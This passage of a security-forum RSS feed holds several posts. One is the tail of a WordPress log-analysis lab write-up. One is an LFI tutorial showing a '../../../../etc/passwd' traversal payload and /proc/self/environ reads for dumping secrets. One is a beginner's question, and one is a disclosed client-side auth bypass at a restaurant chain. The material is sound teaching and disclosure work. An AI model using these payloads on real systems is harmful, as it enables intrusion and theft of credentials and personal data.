<p>First of all, just like the IP 168.22.54.119, this IP also tried to exploit the two plugins: Contact Form 7 and Simple File List.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/a/e/ae51827a4f2bf3a636770d155abe0021b707d16f.png" data-download-href="/uploads/short-url/oS5IeQs2OnSOdOELQcFwba8Pyz5.png?dl=1" title="image" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/a/e/ae51827a4f2bf3a636770d155abe0021b707d16f_2_690x70.png" alt="image" data-base62-sha1="oS5IeQs2OnSOdOELQcFwba8Pyz5" width="690" height="70" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/a/e/ae51827a4f2bf3a636770d155abe0021b707d16f_2_690x70.png, https://0x00sec.s3.amazonaws.com/original/3X/a/e/ae51827a4f2bf3a636770d155abe0021b707d16f.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/a/e/ae51827a4f2bf3a636770d155abe0021b707d16f.png 2x" data-dominant-color="27292A"></a></div><p></p>
<p>Then it goes on and try a bunch of enumerations to find login portals and control panels:</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/e/d/ed06803e318daa5f9d4a8c60fad658bee1a7b5ea.jpeg" data-download-href="/uploads/short-url/xOP5v1mPI4TrY43G6ckcmOajguu.jpeg?dl=1" title="image" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/3X/e/d/ed06803e318daa5f9d4a8c60fad658bee1a7b5ea.jpeg" alt="image" data-base62-sha1="xOP5v1mPI4TrY43G6ckcmOajguu" width="690" height="232" data-dominant-color="28292A"></a></div><p></p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/6/7/6713f5457c41e0ee637e98bc923cc579b71ce546.jpeg" data-download-href="/uploads/short-url/eHRWfk21NkXptS58Zv3jDTUhy9U.jpeg?dl=1" title="image" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/3X/6/7/6713f5457c41e0ee637e98bc923cc579b71ce546.jpeg" alt="image" data-base62-sha1="eHRWfk21NkXptS58Zv3jDTUhy9U" width="690" height="333" data-dominant-color="29282A"></a></div><p></p>
<p>Then it gains some access to the admin account before getting logged out of it.</p>
<p>Since this is an interesting IP address, lets check the user agents used by this IP. We issue the command like before but with this IP address.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/0/c/0c51995bc44cf389f7534b3823387cf50be2b834.jpeg" data-download-href="/uploads/short-url/1KYyoIA5PqdHrvtxZ2bKa56illq.jpeg?dl=1" title="image" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/0/c/0c51995bc44cf389f7534b3823387cf50be2b834_2_690x310.jpeg" alt="image" data-base62-sha1="1KYyoIA5PqdHrvtxZ2bKa56illq" width="690" height="310" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/0/c/0c51995bc44cf389f7534b3823387cf50be2b834_2_690x310.jpeg, https://0x00sec.s3.amazonaws.com/original/3X/0/c/0c51995bc44cf389f7534b3823387cf50be2b834.jpeg 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/0/c/0c51995bc44cf389f7534b3823387cf50be2b834.jpeg 2x" data-dominant-color="29292B"></a></div><p></p>
<p>Here we see something interesting, the attacker used WPScan to enumerate or exploit the WordPress site. So now we know the two tools used by the attacker: sqlmap and wpscan. This answers the 2nd question.</p>
<p>Finally, the attacker has figured out that it is better to use a webshell to access the server. Hence he/she exploited the Simple File List plugin and uploaded the fr34k.png file.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/5/d/5d852859d40f5f6f65531f7da7988a43694b273d.png" data-download-href="/uploads/short-url/dljH0lqMsYpmlXzN8Dqcp8UaRsN.png?dl=1" title="image" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/5/d/5d852859d40f5f6f65531f7da7988a43694b273d_2_690x63.png" alt="image" data-base62-sha1="dljH0lqMsYpmlXzN8Dqcp8UaRsN" width="690" height="63" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/5/d/5d852859d40f5f6f65531f7da7988a43694b273d_2_690x63.png, https://0x00sec.s3.amazonaws.com/original/3X/5/d/5d852859d40f5f6f65531f7da7988a43694b273d.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/5/d/5d852859d40f5f6f65531f7da7988a43694b273d.png 2x" data-dominant-color="2E2A2C"></a></div><p></p>
<p>Now we have a lead. The attacker found a way to exploit the application. So lets see if there are any other files with the same name “fr34k”</p>
<pre><code class="lang-auto">cat access.log | grep "fr34k"
</code></pre>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/d/8/d82cbea5928f5641636a15c11f31fb151a44f871.jpeg" data-download-href="/uploads/short-url/uQmZV60sgJ3aoine3JrTdjus4Bb.jpeg?dl=1" title="image" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/d/8/d82cbea5928f5641636a15c11f31fb151a44f871_2_690x255.jpeg" alt="image" data-base62-sha1="uQmZV60sgJ3aoine3JrTdjus4Bb" width="690" height="255" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/d/8/d82cbea5928f5641636a15c11f31fb151a44f871_2_690x255.jpeg, https://0x00sec.s3.amazonaws.com/original/3X/d/8/d82cbea5928f5641636a15c11f31fb151a44f871.jpeg 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/d/8/d82cbea5928f5641636a15c11f31fb151a44f871.jpeg 2x" data-dominant-color="2C2D2F"></a></div><p></p>
<p>Yeah so we have a bunch. What stands out is fr34k.php and this is probably a webshell which the answer to the 5th question. Interestingly the webshell upload was done by using a different IP address: 103.69.55.212 which had only one 403 Forbidden case.</p>
<p>Finally if we match the IP: 103.69.55.212 and the word “fr34k.php” we get all the logs corresponding to the webshell.</p>
<pre><code class="lang-auto">cat access.log | grep "103.69.55.212" | grep "fr34k.php"
</code></pre>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/7/0/705adf9b7c6f130eecc256627b90c75ad02bf17a.jpeg" data-download-href="/uploads/short-url/g1WaFUCuEr815yBj2kzzToCOSLM.jpeg?dl=1" title="image" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/3X/7/0/705adf9b7c6f130eecc256627b90c75ad02bf17a.jpeg" alt="image" data-base62-sha1="g1WaFUCuEr815yBj2kzzToCOSLM" width="690" height="234" data-dominant-color="2E2D2F"></a></div><p></p>
<p>Here, at the end we see when the attacker tried to access the webshell he/she got a 404 error and this answers the 6th question.</p>
<h1><a name="conclusion-3" class="anchor" href="https://0x00sec.org#conclusion-3"></a>Conclusion</h1>
<p>This is a very interesting challenge that teaches you how to use Linux CLI to analyze the web server logs. To prevent such an attacks, one can use Web Application Firewalls (WAFs). There is a plenty of WordPress WAFs available and you can also use application agnostic WAFs like CloudFlare or CrowdStrike to mitigate such attacks.</p>
<p>Originally published on Medium: <a href="https://medium.com/@higgsborn/blue-teams-lab-log-analysis-compromised-wordpress-15d9d7b883ce" class="inline-onebox" rel="noopener nofollow ugc">Blue Teams Lab: Log Analysis — Compromised WordPress | by Higgsborn | Dec, 2023 | Medium</a></p>
            <p><small>5 posts - 4 participants</small></p>
            <p><a href="https://0x00sec.org/t/blue-teams-lab-log-analysis-compromised-wordpress/38286">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/blue-teams-lab-log-analysis-compromised-wordpress/38286</link>
          <pubDate>Sun, 10 Dec 2023 14:54:59 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-38286</guid>
          <source url="https://0x00sec.org/t/blue-teams-lab-log-analysis-compromised-wordpress/38286.rss">Blue Teams Lab: Log Analysis — Compromised WordPress</source>
        </item>
        <item>
          <title>LFI + /proc shenannigans</title>
          <dc:creator><![CDATA[hatecomputers]]></dc:creator>
          <category>Web Hacking</category>
          <description><![CDATA[
            <p>Yo! Long time no see.  This time i’ll be talking a bit about how to expand your LFI possibilities <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=12" title=":slight_smile:" class="emoji" alt=":slight_smile:" loading="lazy" width="20" height="20"></p>
<p>Wikipedia defines Local File Inclusion (LFI) as a type of web vulnerability that is most commonly found to affect web applications that rely on a scripting run time. This issue is caused when an application builds a path to executable code using an attacker-controlled variable in a way that allows the attacker to control which file is executed at run time. It’s worth mentioning this vulnerability usually takes advantage of another vulnerability type called Path Traversal, in which an attacker can traverse the directory tree, gaining unauthorized access to file system.</p>
<h2><a name="a-simple-example-1" class="anchor" href="https://0x00sec.org#a-simple-example-1"></a>A simple example</h2>
<p>Imagine the following scenario: While performing an assessment, you come across a web application that allows the user to read logs, providing the ability to properly format outputs as you wish. The user can highlight specific information, exclude rows based on filters, so on and so forth.</p>
<p>By poking with the app, eventually you notice the following request flying over the proxy:</p>
<pre data-code-wrap="http"><code class="lang-plaintext">GET /?filename=10122023.log&amp;v=1 HTTP/1.1

Host: http://app.company.com
Origin: http://app.company.com
...additional headers
</code></pre>
<p>Naturally, you decided to replace <code>10122023.log</code> with something else, maybe something along the lines of <code>test.log</code>. As expected, you get a <code>404</code> response from the server, so you know the application actually did look the file up, it just couldn’t find it. You get all psyched and immediately throw in a <code>../../../../etc/passwd</code> in there, and you get the following response back:</p>
<pre><code class="lang-auto">HTTP/1.1 200 OK

access-control-allow-origin: *
referrer-policy: strict-origin-when-cross-origin
content-type: application/json; charset=utf-8
Server: Express

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
syslog:x:102:107::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:996:996:systemd Resolver:/:/usr/sbin/nologin
uuidd:x:103:108::/run/uuidd:/usr/sbin/nologin
tss:x:104:109:TPM software stack,,,:/var/lib/tpm:/bin/false
tcpdump:x:105:110::/nonexistent:/usr/sbin/nologin
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
...
</code></pre>
<p>Jackpot. You are in business.</p>
<p>That’s cool and all, but maybe you want to continue exploiting the application to see how much more you can squeze out of it. Maybe some environment variables? Maybe some hardcoded credentials? The sky is the limit.</p>
<p>The problem is, you put an <code>index.js</code> in there and nothing comes back. You then, try <code>app.js</code>. Also nothing. What? You know it’s a nodejs based app because, being the recon master you are, you couldn’t ignore that <code>Server: Express</code> when first toying around with requests. So as a last resource, you put together a list of possible files and brute force you through just to get to the end of the list with empty hands. WTF did this developer do that he’s not following file naming standards?</p>
<p>So, dead end? You better than that.</p>
<h2><a name="the-proc-directory-2" class="anchor" href="https://0x00sec.org#the-proc-directory-2"></a>The /proc directory</h2>
<p>The /proc directory contains (among other things) one subdirectory for each process running on the system, which is named after the process ID (PID). Consider the following:</p>
<pre><code class="lang-bash">@-box:~$ sleep 20&amp;
@-box:~$ ps -ef | grep "sleep"
user 233322 0.0 0.1 5656 1920 pts/0 S 11:18 0:00 sleep 10
</code></pre>
<p>You call <code>sleep 20</code>, which is gonna hang the process for 20 seconds, while sending it to the background with <code>&amp;</code>. Then, you call <code>ps -ef</code>, which select all processes, while filtering by “sleep”. This gives you the PID which is <code>233322</code>. Now you do:</p>
<pre><code class="lang-sh">@-box:~$ cat /proc/233322/cmdline # and it returns "sleep 20"
</code></pre>
<p>Makes sense?</p>
<p>Another interesting thing is that, this directory has a link to ‘self’, which points to the process currently reading the file system. For instance, if you are sitting on a terminal with your bash session open, and you type <code>cat /proc/self/cmdline</code>, you would get <code>-bash</code> in return, because this, as mentioned before, is the current process reading the file system.</p>
<h2><a name="dumping-the-source-code-3" class="anchor" href="https://0x00sec.org#dumping-the-source-code-3"></a>Dumping the source code</h2>
<p>But going back to the LFI pinnacle: Can you see where we going with this? If you do replace <code>/etc/passwd/</code> with <code>/proc/self/cmdline</code>, you should get the command line arguments that spun the process up, maybe something like <code>node /home/bob/log-app/my-server.js</code>. That would lead you to the entry point file, so you could happily start dumping the source code.</p>
<h2><a name="dumping-environment-variables-4" class="anchor" href="https://0x00sec.org#dumping-environment-variables-4"></a>Dumping environment variables</h2>
<p>'Member when I mentioned environment variables? They usually hold the keys to the castle and having access to it, drastically increases our chances of walking away with something valuable. However, can we get it without achieving a proper RCE? Well, yeah. Turns out, there’s an entry for that too under /proc. All you have to do is setting your payload to <code>/proc/self/environ</code> and whatever environment variables the current process has access to, should be printed out like magic. Isn’t that pretty?</p>
<h2><a name="getting-the-parent-process-id-ppid-5" class="anchor" href="https://0x00sec.org#getting-the-parent-process-id-ppid-5"></a>Getting the parent process ID (PPID)</h2>
<p>There is always a possibility of the application being spawned by another application. In the case of python web apps, for instance, <a href="https://www.uvicorn.org/" rel="noopener nofollow ugc">Uvicorn</a> could be one of the daemons responsible for keeping it up and running. It establishes itself as the parent process in relation to the web application. Having said that, is possible to enumerate that as well, by dumping the file <code>/proc/self/stat</code>. The outcome is similar to what can be seen below:</p>
<pre><code class="lang-auto">164805 (node /home/bob/log-app) S 17612 164805 164805 0 -1 4194304 257091390 30537 33 8 531043 128694 74 67 20 0 11 0 170196020 675442688 11160 18446744073709551615 94626273062912 94626273075221 140735478764848 0 0 0 0 16781312 17922 0 0 0 17 0 0 0 0 0 0 94626273086872 94626273087504 94626292690944 140735478768032 140735478768097 140735478768097 140735478771690 0
</code></pre>
<p>For the purposes of this section, we only care about the <code>17612</code>, as it represents the PPID. Knowing that, you can now go through all the steps we discussed up to this point given the file system is identical regardless of a process being parent or child.</p>
<h2><a name="wrapping-up-6" class="anchor" href="https://0x00sec.org#wrapping-up-6"></a>Wrapping up</h2>
<p>Hope this sheds some light in helping you to level up your LFI game. I obviously would be very much interested in hearing your approach as well, so share away.</p>
<p>See you next time.</p>
<h2><a name="references-7" class="anchor" href="https://0x00sec.org#references-7"></a>References</h2>
<ul>
<li><a href="https://portswigger.net/web-security/file-path-traversal/lab-simple" class="inline-onebox" rel="noopener nofollow ugc">Lab: File path traversal, simple case | Web Security Academy</a></li>
<li><a href="https://docs.kernel.org/filesystems/proc.html" class="inline-onebox" rel="noopener nofollow ugc">The /proc Filesystem — The Linux Kernel documentation</a></li>
</ul>
            <p><small>6 posts - 4 participants</small></p>
            <p><a href="https://0x00sec.org/t/lfi-proc-shenannigans/38264">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/lfi-proc-shenannigans/38264</link>
          <pubDate>Sat, 09 Dec 2023 12:54:38 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-38264</guid>
          <source url="https://0x00sec.org/t/lfi-proc-shenannigans/38264.rss">LFI + /proc shenannigans</source>
        </item>
        <item>
          <title>Ethical Hacking - Extreme Noob - Need Guidance (Where to correctly start?)</title>
          <dc:creator><![CDATA[RookieEthicalHacker]]></dc:creator>
          <category>Beginner Guides</category>
          <description><![CDATA[
            <p><em>Hello World!</em><br>
You will read a lot of stupid questions from this rookie here ^^<br>
After one week of research I have decided that I want to become an Ethical Hacker!</p>
<ul>
<li>I have absolute zero knowledge when it comes to coding in any language, understanding ethical<br>
hacking properly and its tools for each different area in our digital world.<br>
I have been googling a ton, using ChatGPT for many, many questions and I always ended up in a<br>
rabbit hole because there is so much to know about and learn and I have no understanding on<br>
how it all works and where I should start so it becomes overwhelming.</li>
<li><strong>Where do I start? What do I want to achieve?</strong><br>
Well, in my mind I have this picture of helping the ones that no one else is seeing, that are left alone.<br>
I dream about helping the ones that can not help themselves in a difficult position because of higher powers.</li>
</ul>
<p><em><strong>Example:</strong></em> (The Iranian government censur and filter their network for its civilian. During a protest about Jina Mahsa Amini, the girl who got killed by a government morale-police because she was not wearing her hijab/headscarf properly according to them.<br>
Protest began and the government shot down its own network so that people can not upload/share what is happening during the protest.)<br>
So, what happened was some ethical hacker hacked the street cameras and recorded the incidents that happened on the streets and uploaded on the net to the world to see.</p>
<p><em><strong>Example:</strong></em> Lets say a friend of mine owns an animal store and has a website for the store.<br>
The website gets hacked by someone and no one is able to visit the site or the website is showing something else.</p>
<ol>
<li><em><strong>QUESTION:</strong></em> If I knew how to correctly ethically hack those two above, would I need same IT knowledge and tools? Or would I need totally different knowledge/materials for one and each?</li>
<li><em><strong>QUESTION:</strong></em> If I worked for my local Police Department would that then require some other coding language, IT knowledge and other tools if they for example want me to ethical hack someones mobile-phone who is suspicious for being a spy and is a threat according to the government?</li>
</ol>
<ul>
<li>You see, I am trying to understand a bigger picture in this and build a wider perspective around my head while moving towards being an Ethical Hacker.</li>
<li>Also I am trying to move towards my goal in an efficient way rather than trying to learn everything at the same time or maybe learning wrong areas that is not very necessary for an absolute beginner.<br>
That is the main reason I came to this reddit channel in hope to be guided at least the smallest.<br>
Hopefully I can join a local university and expand my knowledge, but until then self learning is in progress.</li>
<li><em><strong>GUIDANCE:</strong></em> I need you guys to guide me understand the very basic fundamentals to begin with.<br>
With that I mean <strong>What books/video/website/App</strong> would you recommend me to start with and in which area? (I do not mind books with hundreds of pages).<br>
Maybe recommend a book that you wish was available when you was a beginner starting Ethical Hacking. Share me your beginner experience.<br>
Do I need to learn about IT/computer and its history first?<br>
Do I need to learn about coding first?<br>
Imagine that I time traveled from 1500’s and have no clue on from where I should start, but somehow I knew that I want to become an ethical hacker x).</li>
</ul>
<p>If you have any other questions feel free to ask!<br>
Thank you very much all to all of you in advance and greetings from this cold and snowy Sweden!</p>
            <p><small>4 posts - 3 participants</small></p>
            <p><a href="https://0x00sec.org/t/ethical-hacking-extreme-noob-need-guidance-where-to-correctly-start/38248">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/ethical-hacking-extreme-noob-need-guidance-where-to-correctly-start/38248</link>
          <pubDate>Fri, 08 Dec 2023 00:58:48 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>No</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-38248</guid>
          <source url="https://0x00sec.org/t/ethical-hacking-extreme-noob-need-guidance-where-to-correctly-start/38248.rss">Ethical Hacking - Extreme Noob - Need Guidance (Where to correctly start?)</source>
        </item>
        <item>
          <title>Web Vulnerabilities and Disclosure Revelations: Unhealthy Habits</title>
          <dc:creator><![CDATA[vict0ni]]></dc:creator>
          <category>Web Hacking</category>
          <description><![CDATA[
            <p><a href="https://hackersbyrez0.com/"><img src="https://0x00sec.s3.amazonaws.com/original/3X/7/7/777d57dc189c6e9458d468311377857cdd3dc120.jpeg" alt="hackersbyrez0.com" data-base62-sha1="h33mFc7cYFe9qMG0FGtNW8hwteU" width="690" height="386"></a></p>
<p>Fast food chains’ growth <a href="https://www.washingtonpost.com/business/2023/08/14/fast-food-inflation/">has increased by an average of 5.75%</a> in the second quarter of 2023. Covid, the Ukraine-Russia war, and supermarket greediness has tremendously increased the food prices, whereas the fast food prices increase in a much slower pace. This makes it a viable nurturing option for many people, thus increasing the fast food companies’ profits. And I can only assume that some of this profit increase will be invested in the means of production and ways to further increase profits in the long and short term.</p>
<p>When it comes to cybersecurity, one of the biggest fast-food companies, Yum! Brands, was <a href="https://therecord.media/ransomware-attack-hits-nearly-300-fast-food-restaurants-in-uk-including-kfc-and-pizza-hut">hit with ransomware in 2023</a>. It was even reported that <a href="https://www.malwarebytes.com/blog/news/2023/04/kfc-pizza-hut-owner-employee-data-stolen-in-ransomware-attack">employee data were stolen</a> during this attack.</p>
<p>So you can see that, inspite of the profit gain, cybersecurity is still a threat for damage. Of course, such large companies are hard to manage, security-wise. But did they learn from past mistakes?</p>
<h2><a name="kfc-authentication-bypass-and-api-exposure-leaks-millions-of-receipts-with-pii-1" class="anchor" href="https://0x00sec.org#kfc-authentication-bypass-and-api-exposure-leaks-millions-of-receipts-with-pii-1"></a>KFC Authentication Bypass and API Exposure leaks Millions of Receipts with PII</h2>
<p>TLDR:</p>
<ul>
<li>Found a “ordering system” web app while look for food-chain related infra on shodan.</li>
<li>WebApp employed client side checks for authentication, could be easily bypassed by settings a localStorage variable</li>
<li>Led to discovery of a api endpoint which discloses customer phone number, delivery addresses, and order details.</li>
</ul>
<p>This is one of those bugs that you can find without ever leaving the browser, it also highlights the importance of enumerating the UI frameworks (React in this case).</p>
<p>We started with a random search for “KFC” on Shodan, while filtering results through countries, we came across an interesting result on AWS Mumbai, a site seemed to be some sort of order management/administration system.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/9/e/9eecd7c7d31c8c557afb922bcd8bd08478e78eb5.png" data-download-href="/uploads/short-url/mFUSbe7mdV4TrkNKCDkf11oqMjb.png?dl=1" title="webpage"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/9/e/9eecd7c7d31c8c557afb922bcd8bd08478e78eb5_2_690x437.png" alt="webpage" data-base62-sha1="mFUSbe7mdV4TrkNKCDkf11oqMjb" width="690" height="437" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/9/e/9eecd7c7d31c8c557afb922bcd8bd08478e78eb5_2_690x437.png, https://0x00sec.s3.amazonaws.com/optimized/3X/9/e/9eecd7c7d31c8c557afb922bcd8bd08478e78eb5_2_1035x655.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/9/e/9eecd7c7d31c8c557afb922bcd8bd08478e78eb5.png 2x" data-dominant-color="6691BA"></a></div><p></p>
<p>First order of business when dealing with a webapp is to pop open devtools and see what we are dealing with, so thats what we did.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/5/d/5d7391228c9ebbe3d148970956996b9cd5c911b7.png" data-download-href="/uploads/short-url/dkI0m9TkR0nXehA3Jg3JGEECIMn.png?dl=1" title="devtools"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/5/d/5d7391228c9ebbe3d148970956996b9cd5c911b7_2_690x428.png" alt="devtools" data-base62-sha1="dkI0m9TkR0nXehA3Jg3JGEECIMn" width="690" height="428" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/5/d/5d7391228c9ebbe3d148970956996b9cd5c911b7_2_690x428.png, https://0x00sec.s3.amazonaws.com/optimized/3X/5/d/5d7391228c9ebbe3d148970956996b9cd5c911b7_2_1035x642.png 1.5x, https://0x00sec.s3.amazonaws.com/optimized/3X/5/d/5d7391228c9ebbe3d148970956996b9cd5c911b7_2_1380x856.png 2x" data-dominant-color="343537"></a></div><p></p>
<p>Luckily we had js source maps, so we didn’t have to read through uglified js code. The imports make it clear that we are dealing with React, the route map gave us a few interesting endpoints to explore.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/7/0/70ced574aef1165c538278081c82dee28b39b09b.png" data-download-href="/uploads/short-url/g5WCcf31QqvF3Wsusc0B4kIXo9B.png?dl=1" title="routermap"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/7/0/70ced574aef1165c538278081c82dee28b39b09b_2_690x457.png" alt="routermap" data-base62-sha1="g5WCcf31QqvF3Wsusc0B4kIXo9B" width="690" height="457" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/7/0/70ced574aef1165c538278081c82dee28b39b09b_2_690x457.png, https://0x00sec.s3.amazonaws.com/optimized/3X/7/0/70ced574aef1165c538278081c82dee28b39b09b_2_1035x685.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/7/0/70ced574aef1165c538278081c82dee28b39b09b.png 2x" data-dominant-color="323030"></a></div><p></p>
<p>So we tried visiting <code>/admin</code> directly and were immediately thrown back to the login page. It was time to take a look at that <code>AdminDashComponent</code> the routemap was referring to.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/e/6/e64ee9fd0dacb6226eaa8f188053ce5b25f6a6d3.png" data-download-href="/uploads/short-url/wRoTdScGhSwOK1b98NQlCmx3pWH.png?dl=1" title="adminComponent"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/e/6/e64ee9fd0dacb6226eaa8f188053ce5b25f6a6d3_2_557x500.png" alt="adminComponent" data-base62-sha1="wRoTdScGhSwOK1b98NQlCmx3pWH" width="557" height="500" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/e/6/e64ee9fd0dacb6226eaa8f188053ce5b25f6a6d3_2_557x500.png, https://0x00sec.s3.amazonaws.com/optimized/3X/e/6/e64ee9fd0dacb6226eaa8f188053ce5b25f6a6d3_2_835x750.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/e/6/e64ee9fd0dacb6226eaa8f188053ce5b25f6a6d3.png 2x" data-dominant-color="2E2C2C"></a></div><p></p>
<p>All the adminComponent did in the name of authorization was check if a localStorage item “token” exists, we happily set the token manually to a random value.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/c/e/ce4cdfe1c4cd7d488430dfa8bbbe7a66afb631a1.png" data-download-href="/uploads/short-url/tr13PL5byVwrwlTcWJdNs2Jn6tH.png?dl=1" title="manual-token-set"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/c/e/ce4cdfe1c4cd7d488430dfa8bbbe7a66afb631a1_2_690x293.png" alt="manual-token-set" data-base62-sha1="tr13PL5byVwrwlTcWJdNs2Jn6tH" width="690" height="293" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/c/e/ce4cdfe1c4cd7d488430dfa8bbbe7a66afb631a1_2_690x293.png, https://0x00sec.s3.amazonaws.com/optimized/3X/c/e/ce4cdfe1c4cd7d488430dfa8bbbe7a66afb631a1_2_1035x439.png 1.5x, https://0x00sec.s3.amazonaws.com/optimized/3X/c/e/ce4cdfe1c4cd7d488430dfa8bbbe7a66afb631a1_2_1380x586.png 2x" data-dominant-color="2E2C2C"></a></div><p></p>
<p>We now tried visiting <code>/admin</code> and voila!</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/b/d/bd59d7febbfa6c9e92dbecde11e6cf8e5d93288f.png" data-download-href="/uploads/short-url/r14JkOe7XQcez1qgVbhBqOuEzUj.png?dl=1" title="admin-panel"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/b/d/bd59d7febbfa6c9e92dbecde11e6cf8e5d93288f_2_690x420.png" alt="admin-panel" data-base62-sha1="r14JkOe7XQcez1qgVbhBqOuEzUj" width="690" height="420" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/b/d/bd59d7febbfa6c9e92dbecde11e6cf8e5d93288f_2_690x420.png, https://0x00sec.s3.amazonaws.com/optimized/3X/b/d/bd59d7febbfa6c9e92dbecde11e6cf8e5d93288f_2_1035x630.png 1.5x, https://0x00sec.s3.amazonaws.com/optimized/3X/b/d/bd59d7febbfa6c9e92dbecde11e6cf8e5d93288f_2_1380x840.png 2x" data-dominant-color="6892BE"></a></div><p></p>
<p>The API was too unstable to get all of the results. With some simple trial and error, we found out that the first entries were from October 30, 2021. We observed that there was an average of 5000 orders per day (more on the weekends, but let’s keep it like this.) From the first day, i.e. 30th of October, until the time of writing (November 8th, 2023) 739 days have passed. This leads to appr. 3.695.000 receipts. Of course, not all of them contain PII. PII could be observed only in delivery receipts, where home addresses, phone numbers, and names were printed out.</p>
<p>Also, when examining the receipts, we came across some interesting delivery addresses and orders, such as a military station.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/4/7/474827ca69ea922446ce740fb993b3f7b70eb394.png" data-download-href="/uploads/short-url/aaAuxWQAa1l4JKmGi4Hd3zfYstK.png?dl=1" title="mil-st"><img src="https://0x00sec.s3.amazonaws.com/original/3X/4/7/474827ca69ea922446ce740fb993b3f7b70eb394.png" alt="mil-st" data-base62-sha1="aaAuxWQAa1l4JKmGi4Hd3zfYstK" width="620" height="499" data-dominant-color="F5F5F5"></a></div><p></p>
<h2><a name="disclosure-2" class="anchor" href="https://0x00sec.org#disclosure-2"></a>Disclosure</h2>
<p>Both vulnerabilities were reported around the same time through <a href="http://responsibledisclosure.com/">responsibledisclosure.com</a>. We have waited for 90 days to pass, in the hope for both vulnerabilities to be patched.</p>
<p>UPDATE: As of December 2023, both vulnerabilities seem fixed!</p>
            <p><small>4 posts - 3 participants</small></p>
            <p><a href="https://0x00sec.org/t/web-vulnerabilities-and-disclosure-revelations-unhealthy-habits/38206">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/web-vulnerabilities-and-disclosure-revelations-unhealthy-habits/38206</link>
          <pubDate>Mon, 04 Dec 2023 14:58:56 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-38206</guid>
